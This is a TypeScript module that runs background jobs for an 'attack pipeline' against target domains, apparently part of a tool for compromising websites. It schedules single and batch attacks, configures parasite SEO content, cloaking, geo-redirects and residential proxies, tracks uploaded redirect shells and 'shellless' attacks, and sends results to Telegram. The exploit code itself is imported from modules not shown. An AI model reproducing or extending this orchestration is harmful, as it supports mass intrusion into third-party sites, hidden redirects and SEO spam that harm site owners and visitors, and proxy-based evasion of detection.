/**
 * Background Job Runner — Runs attack pipeline jobs server-side
 * 
 * Key features:
 * - Pipeline runs in-process (no external queue needed)
 * - All events persisted to pipeline_events table
 * - Deploy record updated in real-time (progress, status)
 * - Jobs survive browser disconnection — user can close tab and come back
 * - Cancellation via in-memory AbortController map
 * - Notification sent on completion
 */
import { getDb } from "./db";
import { autonomousDeploys, pipelineEvents } from "../drizzle/schema";
import { eq, desc, and } from "drizzle-orm";
import { runUnifiedAttackPipeline, type PipelineConfig, type PipelineEvent, type PipelineResult } from "./unified-attack-pipeline";
// Legacy engine removed — unified pipeline only (no infinite loop fallback)
import { AIAutonomousBrain } from "./ai-autonomous-brain";
import { sendTelegramNotification } from "./telegram-notifier";
import { proxyPool } from "./proxy-pool";

// ═══════════════════════════════════════════════
//  IN-MEMORY JOB TRACKING
// ═══════════════════════════════════════════════

interface RunningJob {
  deployId: number;
  abortController: AbortController;
  startedAt: number;
  lastEventAt: number;
  eventCount: number;
  currentPhase: string;
  currentProgress: number;
}

// Map of deployId → RunningJob
const runningJobs = new Map<number, RunningJob>();

// ═══════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════

function parseSeoKeywords(input: unknown): string[] {
  if (!input) return [];
  if (Array.isArray(input)) return input.map(String).filter(Boolean);
  if (typeof input === "string") return input.split(",").map(s => s.trim()).filter(Boolean);
  return [];
}

/** Persist a single pipeline event to DB (fire-and-forget) */
async function persistEvent(deployId: number, event: PipelineEvent) {
  try {
    const db = await getDb();
    if (!db) return;
    await db.insert(pipelineEvents).values({
      deployId,
      phase: event.phase,
      step: event.step,
      detail: event.detail,
      progress: event.progress || 0,
      data: event.data || null,
    });
  } catch (e) {
    // Non-critical — don't crash the pipeline for a logging failure
    console.error(`[JobRunner] Failed to persist event for deploy #${deployId}:`, e);
  }
}

/** Update the deploy record with current progress */
async function updateDeployProgress(deployId: number, phase: string, progress: number) {
  try {
    const db = await getDb();
    if (!db) return;
    // Store progress in the eventsLog field as a quick-access summary
    await db.update(autonomousDeploys).set({
      eventsLog: { currentPhase: phase, currentProgress: progress, lastUpdate: Date.now() },
    } as any).where(eq(autonomousDeploys.id, deployId));
  } catch {
    // Non-critical
  }
}

/** Update deploy record with final results */
async function finalizeDeployRecord(
  deployId: number,
  result: PipelineResult,
  aiBrain: AIAutonomousBrain,
  duration: number,
) {
  try {
    const db = await getDb();
    if (!db) return;

    // Separate real uploads from shellless for accurate counting
    const realUploads = result.uploadedFiles.filter(f => !f.method.startsWith("shellless_"));
    const shelllessRedirects = result.uploadedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks);
    const realVerified = result.verifiedFiles.filter(f => !f.method.startsWith("shellless_"));
    const shelllessVerified = result.verifiedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks);
    const effectiveUploads = [...realUploads, ...shelllessRedirects];
    const effectiveVerified = [...realVerified, ...shelllessVerified];
    const success = result.success && effectiveVerified.length > 0;
    const partial = !success && effectiveUploads.length > 0;

    await db.update(autonomousDeploys).set({
      status: success ? "success" : partial ? "partial" : "failed",
      hostsFound: 1,
      portsFound: 0,
      vulnsFound: result.vulnScan?.misconfigurations?.length || 0,
      credsFound: 0,
      uploadPathsFound: result.vulnScan?.writablePaths?.length || 0,
      shellUrlsFound: effectiveVerified.length,
      filesDeployed: effectiveUploads.length,
      filesVerified: effectiveVerified.length,
      shellUrls: effectiveVerified.map(f => f.url),
      deployedUrls: effectiveUploads.map(f => f.url),
      verifiedUrls: effectiveVerified.map(f => f.url),
      aiStrategyUsed: aiBrain.getStrategies(),
      aiDecisions: result.aiDecisions,
      aiAdaptations: aiBrain.getDecisions().length,
      fullReport: result,
      eventsLog: { currentPhase: "complete", currentProgress: 100, lastUpdate: Date.now() },
      duration,
      completedAt: new Date(),
    } as any).where(eq(autonomousDeploys.id, deployId));
  } catch (e) {
    console.error(`[JobRunner] Failed to finalize deploy #${deployId}:`, e);
  }
}

async function markDeployFailed(deployId: number, errorMessage: string, duration: number) {
  try {
    const db = await getDb();
    if (!db) return;
    await db.update(autonomousDeploys).set({
      status: "failed",
      errorMessage,
      eventsLog: { currentPhase: "error", currentProgress: 0, lastUpdate: Date.now() },
      duration,
      completedAt: new Date(),
    } as any).where(eq(autonomousDeploys.id, deployId));
  } catch (e) {
    console.error(`[JobRunner] Failed to mark deploy #${deployId} as failed:`, e);
  }
}

// ═══════════════════════════════════════════════
//  MAIN JOB EXECUTION
// ═══════════════════════════════════════════════

export interface StartJobParams {
  userId: number;
  targetDomain: string;
  redirectUrl: string;
  mode?: string;
  maxIterations?: number;
  seoKeywords?: string | string[];
  geoRedirect?: boolean;
  parasiteContentLength?: string;
  parasiteRedirectDelay?: number;
  enableCloaking?: boolean;
  cloakingBrand?: string;
  cloakingContentType?: string;
  proxyList?: string;
  weightedRedirects?: string;
  methodPriority?: Array<{ id: string; enabled: boolean }>;
}

/**
 * Start a new background pipeline job.
 * Returns the deployId immediately — pipeline runs in background.
 */
export async function startBackgroundJob(params: StartJobParams): Promise<{ deployId: number }> {
  const db = await getDb();
  if (!db) throw new Error("Database not available");

  const keywords = parseSeoKeywords(params.seoKeywords);

  // 1. Create deploy record with status "running"
  const [result] = await db.insert(autonomousDeploys).values({
    userId: params.userId,
    targetDomain: params.targetDomain,
    redirectUrl: params.redirectUrl,
    mode: (params.mode as "attack" | "fixated" | "emergent") || "emergent",
    goal: "full_deploy",
    maxIterations: params.maxIterations || 5,
    seoKeywords: keywords,
    geoRedirect: params.geoRedirect ?? true,
    parasiteContentLength: params.parasiteContentLength || "medium",
    parasiteRedirectDelay: params.parasiteRedirectDelay || 5,
    status: "running",
    startedAt: new Date(),
    eventsLog: { currentPhase: "init", currentProgress: 0, lastUpdate: Date.now() },
  } as any);

  const deployId = (result as any).insertId;
  if (!deployId) throw new Error("Failed to create deploy record");

  // 2. Set up abort controller
  const abortController = new AbortController();
  const job: RunningJob = {
    deployId,
    abortController,
    startedAt: Date.now(),
    lastEventAt: Date.now(),
    eventCount: 0,
    currentPhase: "init",
    currentProgress: 0,
  };
  runningJobs.set(deployId, job);

  // 3. Fire-and-forget: run pipeline in background
  runPipelineInBackground(deployId, params, keywords, abortController.signal).catch((e) => {
    console.error(`[JobRunner] Unhandled error in background job #${deployId}:`, e);
  });

  return { deployId };
}

/**
 * The actual pipeline execution — runs detached from any HTTP request
 */
async function runPipelineInBackground(
  deployId: number,
  params: StartJobParams,
  keywords: string[],
  signal: AbortSignal,
) {
  const startTime = Date.now();
  const mode = params.mode || "emergent";

  // Create event callback that persists to DB
  const onEvent = (event: PipelineEvent) => {
    if (signal.aborted) return;

    const job = runningJobs.get(deployId);
    if (job) {
      job.lastEventAt = Date.now();
      job.eventCount++;
      job.currentPhase = event.phase;
      job.currentProgress = event.progress;
    }

    // Persist event (fire-and-forget, throttled for non-critical events)
    persistEvent(deployId, event);

    // Update deploy progress every 5 events or on phase changes
    if (job && (job.eventCount % 5 === 0 || event.step === "complete" || event.step === "start")) {
      updateDeployProgress(deployId, event.phase, event.progress);
    }
  };

  // Create AI Brain (no SSE callback needed)
  const aiBrain = new AIAutonomousBrain(() => {});

  try {
    // ─── Persist init event ───
    await persistEvent(deployId, {
      phase: "prescreen",
      step: "init",
      detail: `🚀 Background Job #${deployId} started — Mode: ${mode.toUpperCase()}, Target: ${params.targetDomain}`,
      progress: 0,
    });

    // ─── Parse proxy list (auto-inject residential proxies if none provided) ───
    let proxyList = params.proxyList
      ? params.proxyList.split("\n").map(s => s.trim()).filter(Boolean)
      : undefined;
    
    if (!proxyList || proxyList.length === 0) {
      const poolUrls = proxyPool.getHealthyProxyUrls();
      if (poolUrls.length > 0) {
        proxyList = poolUrls;
        console.log(`[JobRunner] Auto-injected ${poolUrls.length} residential proxies from pool`);
      }
    }

    // ─── Parse weighted redirects ───
    const weightedRedirects = params.weightedRedirects
      ? params.weightedRedirects.split("\n").map(line => {
          const parts = line.trim().split(/[,\t]/);
          if (parts.length >= 2) {
            return { url: parts[0].trim(), weight: parseInt(parts[1].trim()) || 1 };
          } else if (parts[0]) {
            return { url: parts[0].trim(), weight: 1 };
          }
          return null;
        }).filter(Boolean) as Array<{ url: string; weight: number }>
      : undefined;

    // ─── Build pipeline config ───
    const pipelineConfig: PipelineConfig = {
      targetUrl: `https://${params.targetDomain}`,
      redirectUrl: params.redirectUrl,
      seoKeywords: keywords,
      geoRedirect: params.geoRedirect ?? true,
      parasiteContent: (params.parasiteContentLength as "short" | "medium" | "long") || "medium",
      cloaking: true,
      maxUploadAttempts: 3,
      timeoutPerMethod: 30000,
      enableCloaking: params.enableCloaking ?? true,
      cloakingBrand: params.cloakingBrand,
      cloakingContentType: (params.cloakingContentType as "landing" | "article" | "doorway" | "review") || "landing",
      // Advanced config from frontend
      methodPriority: params.methodPriority,
      proxyList: proxyList,
      weightedRedirects: weightedRedirects,
      // User tracking — ensures attack logs are linked to the correct user
      userId: params.userId,
    };

    // ─── Phase 1: Run Unified Attack Pipeline ───
    let pipelineResult: PipelineResult | null = null;
    try {
      pipelineResult = await Promise.race([
        runUnifiedAttackPipeline(pipelineConfig, onEvent),
        new Promise<PipelineResult>((_, reject) => setTimeout(() => reject(new Error("Pipeline timeout (10min)")), 10 * 60 * 1000)),
        new Promise<PipelineResult>((_, reject) => {
          signal.addEventListener("abort", () => reject(new Error("Job cancelled by user")));
        }),
      ]);
    } catch (e: any) {
      if (signal.aborted) throw new Error("Job cancelled by user");
      await persistEvent(deployId, {
        phase: "error",
        step: "pipeline_error",
        detail: `⚠️ Unified Pipeline error: ${e.message} — falling back to legacy engine`,
        progress: 50,
      });
    }

    // ─── Check if pipeline succeeded (only real file uploads or shellless with confirmed redirect) ───
    const pipelineRealVerified = pipelineResult?.verifiedFiles.filter(f => !f.method.startsWith("shellless_")) || [];
    const pipelineShelllessRedirect = pipelineResult?.verifiedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks) || [];
    if (pipelineResult && pipelineResult.success && (pipelineRealVerified.length > 0 || pipelineShelllessRedirect.length > 0)) {
      const duration = Date.now() - startTime;
      await finalizeDeployRecord(deployId, pipelineResult, aiBrain, duration);
      await persistEvent(deployId, {
        phase: "complete",
        step: "success",
        detail: `🎉 Pipeline สำเร็จ! ${pipelineResult.verifiedFiles.length} files verified (${Math.round(duration / 1000)}s)`,
        progress: 100,
        data: { verifiedUrls: pipelineResult.verifiedFiles.map(f => f.url) },
      });

      // Notify via Telegram (primary notification channel)
      try {
        await sendTelegramNotification({
          type: "success",
          targetUrl: params.targetDomain,
          redirectUrl: params.redirectUrl,
          deployedUrls: pipelineResult.verifiedFiles.map(f => f.url),
          shellType: "redirect_php",
          duration: Date.now() - startTime,
          errors: [],
          keywords: Array.isArray(params.seoKeywords) ? params.seoKeywords : (params.seoKeywords ? [params.seoKeywords] : []),
          cloakingEnabled: false,
          injectedFiles: 0,
          details: `${pipelineResult.verifiedFiles.length} files verified, redirect working`,
        });
      } catch { /* notification is best-effort */ }

      runningJobs.delete(deployId);
      return;
    }

    // ─── Pipeline finished (no legacy fallback — single pass only) ───
    const duration = Date.now() - startTime;
    // Separate real uploads from shellless for accurate status
    const realUploads = pipelineResult?.uploadedFiles.filter(f => !f.method.startsWith("shellless_")) || [];
    const shelllessWithRedirect = pipelineResult?.uploadedFiles.filter(f => f.method.startsWith("shellless_") && f.redirectWorks) || [];
    const hasRealUploaded = realUploads.length > 0;
    const hasRealVerified = pipelineResult ? pipelineResult.verifiedFiles.filter(f => !f.method.startsWith("shellless_")).length > 0 : false;
    const hasShelllessRedirect = shelllessWithRedirect.length > 0;
    const hasUploaded = hasRealUploaded || hasShelllessRedirect;
    const hasVerified = hasRealVerified || hasShelllessRedirect;
    const partial = hasRealUploaded && !hasRealVerified;

    // Finalize deploy record with whatever we got
    if (pipelineResult) {
      await finalizeDeployRecord(deployId, pipelineResult, aiBrain, duration);
    } else {
      await markDeployFailed(deployId, "Pipeline returned no result", duration);
    }

    const shelllessSuccesses = pipelineResult?.shelllessResults?.filter(r => r.success) || [];
    const statusText = hasVerified
      ? `🎉 Pipeline สำเร็จ! ${pipelineResult!.verifiedFiles.length} files verified`
      : partial
        ? `⚠️ Pipeline บางส่วนสำเร็จ — ${pipelineResult!.uploadedFiles.length} files uploaded แต่ยังไม่ verified`
        : shelllessSuccesses.length > 0
          ? `⚠️ Shellless Attack พบ ${shelllessSuccesses.length} ช่องทาง แต่ redirect ยังไม่ทำงาน (ไม่ต้องวางไฟล์)`
          : `❌ Pipeline ล้มเหลว — ไม่สามารถวางไฟล์ได้ + Shellless Attack ไม่สำเร็จ`;

    await persistEvent(deployId, {
      phase: "complete",
      step: hasVerified ? "success" : partial ? "partial" : "failed",
      detail: `${statusText} (${Math.round(duration / 1000)}s)`,
      progress: 100,
      data: pipelineResult ? {
        verifiedUrls: pipelineResult.verifiedFiles.map(f => f.url),
        uploadedUrls: pipelineResult.uploadedFiles.map(f => f.url),
      } : undefined,
    });

    // Notify via Telegram (primary notification channel)
    try {
      const realDeployedUrls = pipelineResult?.uploadedFiles
        .filter(f => !f.method.startsWith("shellless_") || f.redirectWorks)
        .map(f => f.url)
        .filter(url => url !== params.targetDomain) || [];
      const shelllessRedirects = pipelineResult?.uploadedFiles
        .filter(f => f.method.startsWith("shellless_") && f.redirectWorks)
        .map(f => `${f.url} (via ${f.method.replace("shellless_", "")})`) || [];
      const deployedUrls = realDeployedUrls.length > 0 ? realDeployedUrls : shelllessRedirects;

      await sendTelegramNotification({
        type: hasVerified ? "success" : (hasShelllessRedirect ? "partial" : (partial ? "partial" : "failure")),
        targetUrl: params.targetDomain,
        redirectUrl: params.redirectUrl,
        deployedUrls,
        shellType: "redirect_php",
        duration,
        errors: pipelineResult?.errors.slice(0, 5) || [],
        keywords: Array.isArray(params.seoKeywords) ? params.seoKeywords : (params.seoKeywords ? [params.seoKeywords] : []),
        cloakingEnabled: false,
        injectedFiles: 0,
        details: statusText,
      });
    } catch { /* best-effort */ }

  } catch (e: any) {
    const duration = Date.now() - startTime;
    await markDeployFailed(deployId, e.message, duration);
    await persistEvent(deployId, {
      phase: "error",
      step: "fatal",
      detail: `❌ Job failed: ${e.message}`,
      progress: 0,
    });

    // Notify failure via Telegram
    try {
      await sendTelegramNotification({
        type: "failure",
        targetUrl: params.targetDomain,
        redirectUrl: params.redirectUrl,
        deployedUrls: [],
        shellType: "unknown",
        duration,
        errors: [e.message],
        keywords: Array.isArray(params.seoKeywords) ? params.seoKeywords : (params.seoKeywords ? [params.seoKeywords] : []),
        cloakingEnabled: false,
        injectedFiles: 0,
        details: `Job #${deployId} error: ${e.message}`,
      });
    } catch { /* best-effort */ }
  } finally {
    runningJobs.delete(deployId);
  }
}

// ═══════════════════════════════════════════════
//  JOB MANAGEMENT API
// ═══════════════════════════════════════════════

/** Cancel a running job */
export function cancelJob(deployId: number): boolean {
  const job = runningJobs.get(deployId);
  if (!job) return false;
  job.abortController.abort();
  runningJobs.delete(deployId);
  return true;
}

/** Get in-memory status of a running job */
export function getRunningJobStatus(deployId: number): RunningJob | null {
  return runningJobs.get(deployId) || null;
}

/** Check if a job is currently running in memory */
export function isJobRunning(deployId: number): boolean {
  return runningJobs.has(deployId);
}

/** Get all currently running job IDs */
export function getRunningJobIds(): number[] {
  return Array.from(runningJobs.keys());
}

/** Get events for a deploy from DB */
export async function getJobEvents(deployId: number, afterId?: number, limit = 100): Promise<any[]> {
  const db = await getDb();
  if (!db) return [];

  const conditions = [eq(pipelineEvents.deployId, deployId)];
  if (afterId) {
    // Get events after a certain ID (for polling new events)
    const { gt } = await import("drizzle-orm");
    conditions.push(gt(pipelineEvents.id, afterId));
  }

  const rows = await db
    .select()
    .from(pipelineEvents)
    .where(and(...conditions))
    .orderBy(pipelineEvents.id)
    .limit(limit);

  return rows;
}

/** Get deploy record with current status */
export async function getJobStatus(deployId: number) {
  const db = await getDb();
  if (!db) return null;

  const [row] = await db
    .select()
    .from(autonomousDeploys)
    .where(eq(autonomousDeploys.id, deployId))
    .limit(1);

  if (!row) return null;

  // Merge in-memory running state
  const inMemory = runningJobs.get(deployId);

  return {
    ...row,
    isRunning: !!inMemory,
    liveProgress: inMemory ? {
      phase: inMemory.currentPhase,
      progress: inMemory.currentProgress,
      eventCount: inMemory.eventCount,
      elapsedMs: Date.now() - inMemory.startedAt,
    } : null,
  };
}

/** List recent jobs for a user */
export async function listUserJobs(userId: number, limit = 20) {
  const db = await getDb();
  if (!db) return [];

  const rows = await db
    .select()
    .from(autonomousDeploys)
    .where(eq(autonomousDeploys.userId, userId))
    .orderBy(desc(autonomousDeploys.id))
    .limit(limit);

  // Annotate with running status
  return rows.map(row => ({
    ...row,
    isRunning: runningJobs.has(row.id),
    liveProgress: runningJobs.has(row.id) ? {
      phase: runningJobs.get(row.id)!.currentPhase,
      progress: runningJobs.get(row.id)!.currentProgress,
      eventCount: runningJobs.get(row.id)!.eventCount,
      elapsedMs: Date.now() - runningJobs.get(row.id)!.startedAt,
    } : null,
  }));
}

// ═══════════════════════════════════════════════
//  BATCH JOB SUPPORT
// ═══════════════════════════════════════════════

export interface BatchJobParams extends Omit<StartJobParams, "targetDomain" | "redirectUrl"> {
  targets: Array<{ domain: string; redirectUrl: string }>;
}

export interface BatchJobResult {
  batchId: string;
  deployIds: number[];
  totalTargets: number;
}

/**
 * Start a batch of background pipeline jobs.
 * Each target gets its own deploy record and runs sequentially to avoid overloading.
 */
export async function startBatchJob(params: BatchJobParams): Promise<BatchJobResult> {
  const batchId = `batch_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  const deployIds: number[] = [];

  // Start all jobs — they run in background sequentially with a small delay between each
  for (let i = 0; i < params.targets.length; i++) {
    const target = params.targets[i];
    try {
      const result = await startBackgroundJob({
        ...params,
        targetDomain: target.domain,
        redirectUrl: target.redirectUrl,
      });
      deployIds.push(result.deployId);

      // Small delay between jobs to avoid overwhelming the system
      if (i < params.targets.length - 1) {
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    } catch (e: any) {
      console.error(`[BatchJob] Failed to start job for ${target.domain}: ${e.message}`);
      // Continue with remaining targets
    }
  }

  return {
    batchId,
    deployIds,
    totalTargets: params.targets.length,
  };
}

/** Get status of all jobs in a batch */
export async function getBatchStatus(deployIds: number[]) {
  const statuses = await Promise.all(
    deployIds.map(id => getJobStatus(id))
  );
  
  const total = statuses.length;
  const completed = statuses.filter(s => s && (s.status === "success" || s.status === "partial" || s.status === "failed")).length;
  const running = statuses.filter(s => s?.isRunning).length;
  const succeeded = statuses.filter(s => s?.status === "success").length;
  const failed = statuses.filter(s => s?.status === "failed").length;

  return {
    total,
    completed,
    running,
    succeeded,
    failed,
    progress: total > 0 ? Math.round((completed / total) * 100) : 0,
    jobs: statuses.filter(Boolean),
  };
}
